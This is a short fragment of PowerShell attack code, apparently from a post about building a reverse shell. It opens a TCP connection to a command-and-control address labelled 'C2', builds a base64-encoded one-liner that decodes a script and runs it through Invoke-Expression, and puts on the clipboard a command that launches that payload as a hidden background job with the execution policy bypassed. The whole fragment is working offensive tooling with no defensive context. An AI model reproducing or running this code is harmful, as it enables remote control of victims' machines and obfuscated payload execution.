...
#Connect to C2
  try{
      $TCPClient = New-Object Net.Sockets.TCPClient("192.168.126.129", "1234")
  } catch {}
...
$oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"
$c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
Set-Clipboard -Value "Start-Job -ScriptBlock { powershell.exe  -ExecutionPolicy Bypass -Encoded $c }"
</code></pre>
